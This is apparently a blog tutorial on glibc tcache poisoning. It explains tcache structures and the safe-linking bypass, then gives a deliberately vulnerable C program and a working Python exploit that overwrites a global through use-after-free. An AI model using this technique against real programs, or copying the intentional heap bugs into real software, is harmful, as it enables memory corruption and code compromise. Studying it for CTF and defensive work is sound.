---
layout: post
title: Tcache Poisioning
description:
date: 2025-09-25
categories:
  - Notes
  - heap-exploitation
tags:
  - tcache
  - tcach-poisioning
---
## Understanding `Tcache`

Thread Local Caching (`Tcache`) is a set of bins, organised as singly-linked lists, that are local to each thread. `Tcache` was made to avoid the need to lock a global arena for frequent small allocations (from 0x10 up to 0x400, excluding metadata), making multi-threaded programs faster. When a chunk is freed, it gets placed into one of these bins. Each bin can store up to 7 bins in a single thread, and when the `tcache` bins are full then the chunks go to the standard bins. The `tcache` bins are singly-linked lists (LIFO).

Each Thread has its own `tcache_perthread_struct` which contains 2 arrays:
1. An array of bins for different chunks sizes.
2. A corresponding array of counts for each bin.

```c
typedef struct tcache_perthread_struct {
	char counts[TCACHE_MAX_BINS];
	tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

When a chunk is freed into the `tcache` bin, its user data area is repurposed to store a `tcache_entry` structure. The `tcache_entry` structure contains:
1. A pointer that points to the next free chunk in the bin.
2. A key field used for security checks.
	- This field is a pointer back to the `tcache_perthread_struct` structure, and its only purpose is to detect double free attempts.
	- This mitigation can be bypassed by overwriting the key field.

```c
typedef struct tcache_entry {
	struct tcache_entry *next; 
	/* This field exists to detect double frees. */ 
	uintptr_t key;_
} tcache_entry;
```
## Exploitation

You need some type of bug that can provide the initial foothold needed to carry out `poisoning` :
- **Use-After-Free (`UAF`)**
- **Double Free**
- **Heap Overflow**

`Tcache`  also has some mitigations:
- **Double Free protection**: (mentioned earlier) The key field in the `tcache_entry` field is used to detect double frees.
- **Safe Linking** : this mitigation encrypts the next pointer in the `tcache_entry` structure by `XORing` it with the address of the pointer itself, shifted right by 12 bits. This makes it harder to overwrite the pointer with an arbitrary address. This can be bypassed by leaking a heap address from the same memory region, they can often compute the correct value needed to poison the pointer.
### `Tcache` Poisoning

The aim of this technique is to trick `malloc` into returning a pointer to an arbitrary memory location (e.g function return address, hook pointer, etc.). This technique provides a **write-what-where** primitive.

Process of the technique:
1. Free at least 2 chunks (`tcache` size).
2. Use a vulnerability such as use-after-free or heap overflow, to overwrite the next pointer of the `tcache_entry` structure of a freed chunk that is currently in the `tcache` bin with a target address that you want to overwrite (e.g. GOT entry or `__malloc_hook`).
	- This needs a leak of the chunks address that we are overwriting. The `next ptr` must be overwritten with : `fake_next_ptr = ((target_address ) ^ (heap_chunk_address >> 12))` 
3. Make two `malloc` calls for chunk of the same size as the poisoned free chunk.
	- First `malloc` call returns, corrupted chunk from the `tcache`.
	- Second `malloc` call follows the poisoned next pointer from the `tcache_entry` structure and returns a chunk at the attacker's chosen arbitrary address.
4. You can now write data directly to the arbitrary address.

#### Example 

This is a example of a arbitrary write.

Vulnerable Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct user {
	char username[0x10];
	char target[32];
} users;

int main() {
	setbuf(stderr, NULL);
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	char *ptrs[10] = {0};
	int count = 0;
	int choice, size, index;

	printf("Enter username: ");
	scanf("%s", users.username);

	strcpy(users.target, "nothing"); 
	printf("target: %p\n\n", users.target); 

	while (1) {
		printf("\n1. allocate\n2. enter data\n3. free\n4.view target \n>> ");
		scanf("%d", &choice);
		switch (choice) {
			case 1:
				printf("size: ");
				scanf("%d", &size);
				ptrs[count] = malloc(size);
				printf("leak: %p\n", ptrs[count]);
				count++;
				break;
			case 2:
				printf("index: ");
				scanf("%d", &index);
				printf("data: ");
				scanf("%s", ptrs[index]);
				break;
			case 3:
				printf("index: ");
				scanf("%d", &index);
				free(ptrs[index]);
			case 4:
				printf("%s\n", users.target);
			default:
				break;
		}
	}
	return 0;
}
```

The goal here is to overwrite `users.target`. 

Options
1. Asks for size and calls `malloc` with that size, and then prints the pointer to the allocated chunk (leak).
2. Asks for Index and data to input into a chunk. (heap overflow present)
3. Frees a chunk. (User-after-free)
4. Prints the contents of `users.target`

##### Exploitation

First the `users.username` field is there for use to insert metadata for our fake chunk in order to pass the `size check`.

First we need to 2 allocate chunks  and then free them.

```python
size = 0x10
a = t.malloc(size) # 0
b = t.malloc(size) # 1

t.free(0)
t.free(1)
```

Here is the `tcache` bin

![Tcache bin](/assets/images/pwn/tcache/tcache_bins.png)

We will use a use-after-free vulnerability to overwrite the `fd/next` pointer of the last chunk in the `tcache` bins : `0x4052c0` which is `b` in our exploit code.

Now lets create our fake `fd/next` pointer.

We need to shift the chunk address by 12 bits and then `XOR` that to our target address (`users.target`).

```python
fake_next_ptr = (target ^ (b >> 12))
```

Now we use our use-after-free to overwrite the `fd/next` pointer of the chunk b `0x4052c0`:

```python
t.scanf(1, p64(fake_next_ptr))
# index 1 = b : 0x4052c0
```

We can see in the image below that now the `tcache` bins contain our target address.

![Tcache bin](/assets/images/pwn/tcache/tcache_c.png)

Target Memory Location: `0x404090`

- Before corruption: `0x4052c0 -> 0x4052a0`
- After corruption: `0x4052c0 -> 0x404090`

The next call to `malloc` of the same size will return the chunk `b` : `0x4052c0`, then the next one will return our target memory location.

```python
c = t.malloc(size) # 2
d = t.malloc(size) # 3
```

`d` is our target memory location.

Now we can write to our target.

```python
t.scanf(3, b"pwned")
```

Full exploit code

```python
class Tcache:
	def __init__(self):
		self.c = b">> "
		self.count = 0

	def malloc(self, size:int):
		log.info(f"Allocating chunk {self.count}")
		sla(self.c, b'1')
		sla(b'size: ', str(size).encode())
		ru(b"0x")
		leak = int(rl(), 16)
		print_leak("leak ", leak)
		self.count += 1
		return leak

	def free(self, index:int):
		log.info(f"Now Freeing chunk {index}")
		sla(self.c, b'3')
		sla(b"index: ", str(index).encode())

	def scanf(self, index:int, data:bytes):
		sla(self.c, b'2')
		sla(b"index: ", str(index).encode())
		sla(b"data: ", data)

	def check(self):
		sla(self.c, b'4')
		x = rl().rstrip(b"\r\n")
		log.info(f"Target Holds: '{x.decode()}'")


def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################
	size = 0x10
	metadata = flat(
		0x20
	)
	log.info(f"Metadata: {metadata} | len {len(metadata)}")
	sla(b"username: ", metadata)
	ru(b"target: ")
	target = int(rl(), 16)
	print_leak("target", target)

	t = Tcache()
	a = t.malloc(size)
	b = t.malloc(size)

	fake_next_ptr = ((target ) ^ (b >> 12))
	t.free(0)
	t.free(1)

	log.info("Use After Free on chunk 1")
	t.scanf(1, p64(fake_next_ptr))
	c = t.malloc(size)
	d = t.malloc(size)
	t.scanf(3, b"pwned")
	t.check()
	
```


We we run the code.

![Tcache bin](/assets/images/pwn/tcache/result.png)

As you can see `users.target` now holds our string "pwned"

---
## References


